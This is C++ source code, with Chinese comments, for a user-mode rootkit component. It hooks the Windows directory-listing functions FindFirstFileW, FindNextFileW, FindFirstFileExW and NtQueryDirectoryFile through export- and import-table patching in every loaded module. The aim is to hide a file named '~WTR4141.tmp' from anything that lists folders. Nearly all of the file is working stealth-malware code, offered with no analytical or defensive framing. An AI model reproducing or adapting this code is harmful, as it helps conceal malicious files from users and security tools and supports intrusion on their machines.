
#include"include.h"
#include"MyQueryDirectoryFile.h"

#pragma comment(lib,"imagehlp.lib")

#define HIDEFILE L"c:\\~WTR4141.tmp"

typedef HANDLE(WINAPI* PFNFindFirstFile)(LPCWSTR lpFileName, LPWIN32_FIND_DATA lpFindFileData);
typedef BOOL(WINAPI* PFNFindNextFile)(HANDLE hFindFile, LPWIN32_FIND_DATA lpFindFileData);
typedef HANDLE(WINAPI* PFNFindFirstFileEx)(LPCWSTR lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS  fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags);

DWORD* oldFindFirstFileWAddr, * newFindFirstFileWAddr;
DWORD* oldFindNextFileWAddr, * newFindNextFileWAddr;
DWORD* oldFindFirstFileExWAddr, * newFindFirstFileExWAddr;

DWORD* newNtQueryDirectoryFileAddr;
DWORD* newZwQueryDirectoryFileAddr;

bool IsFileOrDirNeedToHide(CONST LPWIN32_FIND_DATAW lpFileData)
{
	std::wstring Hidefile;
	Hidefile.append(HIDEFILE);
	int pos = Hidefile.rfind(L"\\", Hidefile.length());
	Hidefile = Hidefile.substr(pos + 1, -1);
	if (_wcsnicmp((wchar_t*)lpFileData->cFileName, Hidefile.c_str(), Hidefile.length()) == 0)
	{
		return true;
	}
	else
	{
		return false;
	}
}

HANDLE WINAPI MyFindFirstFileW(LPCWSTR lpFileName, LPWIN32_FIND_DATA lpFindFileData)
{
	HANDLE hOldFuncRet = INVALID_HANDLE_VALUE;

	//调用原来的函数进行首次搜索
	hOldFuncRet = ((PFNFindFirstFile)oldFindFirstFileWAddr)(lpFileName, lpFindFileData);

	if (hOldFuncRet == INVALID_HANDLE_VALUE)
		return hOldFuncRet;

	if (IsFileOrDirNeedToHide((LPWIN32_FIND_DATAW)lpFindFileData) == FALSE)
	{
		//不是隐藏的文件
		return hOldFuncRet;
	}
	else
	{
		//是隐藏的文件
		FindClose(hOldFuncRet);
		return INVALID_HANDLE_VALUE;
	}
}

HANDLE WINAPI MyFindFirstFileExW(LPCWSTR lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS  fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags)
{
	HANDLE hOldFuncRet = INVALID_HANDLE_VALUE;

	//调用原来的函数进行首次搜索
	hOldFuncRet = ((PFNFindFirstFileEx)oldFindFirstFileExWAddr)(lpFileName, fInfoLevelId, lpFindFileData, fSearchOp, lpSearchFilter, dwAdditionalFlags);

	if (hOldFuncRet == INVALID_HANDLE_VALUE)
		return hOldFuncRet;

	if (fInfoLevelId != FindExInfoStandard &&
		fInfoLevelId != FindExInfoBasic)
	{
		return hOldFuncRet;
	}
	
	if (IsFileOrDirNeedToHide((LPWIN32_FIND_DATAW)lpFindFileData) == FALSE)
	{
		//不是隐藏的文件
		return hOldFuncRet;
	}
	else
	{
		//是隐藏的文件
		FindClose(hOldFuncRet);
		return INVALID_HANDLE_VALUE;
	}
}

BOOL WINAPI MyFindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATA lpFindFileData)
{
	BOOL OldFuncRet = FALSE;
	while (TRUE)
	{
		OldFuncRet=((PFNFindNextFile)oldFindNextFileWAddr)(hFindFile, lpFindFileData);
		if (OldFuncRet == FALSE)
			break;
		if (IsFileOrDirNeedToHide(lpFindFileData) == FALSE)
			break;
	}
	return OldFuncRet;
}

bool Kernel32DllIATHookFind(std::vector<HookOne> hookfunclist)
{
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, GetCurrentProcessId());
	if (hSnap == INVALID_HANDLE_VALUE)
	{
		OutputDebugString(L"CreateToolhelp32Snapshot() failed ");
		return false;
	}
	MODULEENTRY32 me;
	me.dwSize = sizeof(me);
	Module32First(hSnap, &me);
	do
	{
		int ansiiLen = WideCharToMultiByte(CP_ACP, 0, me.szModule, -1, nullptr, 0, nullptr, nullptr);
		// 给指向缓冲区的指针变量分配内存    
		char* pAssii = (char*)malloc(sizeof(char) * ansiiLen);
		// 开始向缓冲区转换字节    
		WideCharToMultiByte(CP_ACP, 0, me.szModule, -1, pAssii, ansiiLen, nullptr, nullptr);
		std::string _moduleName = pAssii;
		free(pAssii);
		if (_wcsicmp(me.szModule, L"~WTR4141.tmp") == 0) continue;
		if (_wcsicmp(me.szModule, L"kernel32.dll") == 0) continue;		//排除自身模块
		if (_wcsicmp(me.szModule, L"browselc.dll") == 0) continue;	//HOOK之后会崩溃

		std::vector<HookOne>::iterator iter = hookfunclist.begin();
		for (; iter != hookfunclist.end(); iter++)
		{
			iter->isHook = false;
		}
		hookIAT((char*)_moduleName.c_str(), "kernel32.dll", hookfunclist);

	} while (Module32Next(hSnap, &me));
	CloseHandle(hSnap);
}

bool ntdllDllIATHookFind(std::vector<HookOne> hookfunclist)
{
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, GetCurrentProcessId());
	if (hSnap == INVALID_HANDLE_VALUE)
	{
		OutputDebugString(L"CreateToolhelp32Snapshot() failed ");
		return false;
	}
	MODULEENTRY32 me;
	me.dwSize = sizeof(me);
	Module32First(hSnap, &me);
	do
	{
		int ansiiLen = WideCharToMultiByte(CP_ACP, 0, me.szModule, -1, nullptr, 0, nullptr, nullptr);
		// 给指向缓冲区的指针变量分配内存    
		char* pAssii = (char*)malloc(sizeof(char) * ansiiLen);
		// 开始向缓冲区转换字节    
		WideCharToMultiByte(CP_ACP, 0, me.szModule, -1, pAssii, ansiiLen, nullptr, nullptr);
		std::string _moduleName = pAssii;
		free(pAssii);
		if (_wcsicmp(me.szModule, L"~WTR4141.tmp") == 0) continue;
		if (_wcsicmp(me.szModule, L"ntdll.dll") == 0) continue;		//排除自身模块
		//if (_wcsicmp(me.szModule, L"kernel32.dll") == 0) continue;
		if (_wcsicmp(me.szModule, L"browselc.dll") == 0) continue;	//HOOK之后会崩溃

		std::vector<HookOne>::iterator iter = hookfunclist.begin();
		for (; iter != hookfunclist.end(); iter++)
		{
			iter->isHook = false;
		}
		hookIAT((char*)_moduleName.c_str(), "ntdll.dll", hookfunclist);

	} while (Module32Next(hSnap, &me));
	CloseHandle(hSnap);
}


DWORD WINAPI APIHOOK(LPVOID lpParameter)
{
	OutputDebugString(L"begin apihook thread!");
	HMODULE h;
	h = GetModuleHandle(L"kernel32.dll");
	if (h == NULL)
	{
		OutputDebugString(L"get kernel32 module failed!");
		return 0;
	}
	newFindFirstFileWAddr = (DWORD*)MyFindFirstFileW;
	oldFindFirstFileWAddr = (DWORD*)GetProcAddress(h, "FindFirstFileW");
	newFindNextFileWAddr = (DWORD*)MyFindNextFileW;
	oldFindNextFileWAddr = (DWORD*)GetProcAddress(h, "FindNextFileW");
	newFindFirstFileExWAddr = (DWORD*)MyFindFirstFileExW;
	oldFindFirstFileExWAddr = (DWORD*)GetProcAddress(h, "FindFirstFileExW");
	OutputDebugString(L"begin kernel32.dll EAT hook!");
	hookEAT((char*)"kernel32.dll", (char*)"FindFirstFileW", newFindFirstFileWAddr);
	hookEAT((char*)"kernel32.dll", (char*)"FindNextFileW", newFindNextFileWAddr);
	hookEAT((char*)"kernel32.dll", (char*)"FindFirstFileExW", newFindFirstFileExWAddr);
	OutputDebugString(L"begin kernel32.dll IAT hook!");
	std::vector<HookOne> hookfunclist;
	HookOne hookFindFirstFileW;
	hookFindFirstFileW.API_Name = "FindFirstFileW";
	hookFindFirstFileW.newFun = newFindFirstFileWAddr;
	hookFindFirstFileW.isHook = false;
	hookfunclist.push_back(hookFindFirstFileW);
	HookOne hookFindNextFileW;
	hookFindNextFileW.API_Name = "FindNextFileW";
	hookFindNextFileW.newFun = newFindNextFileWAddr;
	hookFindNextFileW.isHook = false;
	hookfunclist.push_back(hookFindNextFileW);
	HookOne hookFindFirstFileExW;
	hookFindFirstFileExW.API_Name = "FindFirstFileExW";
	hookFindFirstFileExW.newFun = newFindFirstFileExWAddr;
	hookFindFirstFileExW.isHook = false;
	hookfunclist.push_back(hookFindFirstFileExW);
	Kernel32DllIATHookFind(hookfunclist);

	//hook ntdll
	h = GetModuleHandle(L"ntdll.dll");
	if (h == NULL)
	{
		OutputDebugString(L"get ntdll module failed!");
		return 0;
	}
	newNtQueryDirectoryFileAddr = (DWORD*)MyNtQueryDirectoryFile;
	oldNtQueryDirectoryFile = (__pfnNtQueryDirectoryFile)GetProcAddress(h, "NtQueryDirectoryFile");
	newZwQueryDirectoryFileAddr = (DWORD*)MyZwQueryDirectoryFile;
	oldZwQueryDirectoryFile = (__pfnZwQueryDirectoryFile)GetProcAddress(h, "ZwQueryDirectoryFile");
	OutputDebugString(L"begin EAT hook!");
	hookEAT((char*)"ntdll.dll", (char*)"NtQueryDirectoryFile", newNtQueryDirectoryFileAddr);
	hookEAT((char*)"ntdll.dll", (char*)"ZwQueryDirectoryFile", newZwQueryDirectoryFileAddr);
	OutputDebugString(L"begin IAT hook!");
	hookfunclist.clear();
	HookOne hookNtQueryDirectoryFile;
	hookNtQueryDirectoryFile.API_Name = "NtQueryDirectoryFile";
	hookNtQueryDirectoryFile.newFun = newNtQueryDirectoryFileAddr;
	hookNtQueryDirectoryFile.isHook = false;
	hookfunclist.push_back(hookNtQueryDirectoryFile);
	//HookOne hookZwQueryDirectoryFile;
	//hookZwQueryDirectoryFile.API_Name = "ZwQueryDirectoryFile";
	//hookZwQueryDirectoryFile.newFun = newZwQueryDirectoryFileAddr;
	//hookZwQueryDirectoryFile.isHook = false;
	//hookfunclist.push_back(hookZwQueryDirectoryFile);
	ntdllDllIATHookFind(hookfunclist);
	return 0;
}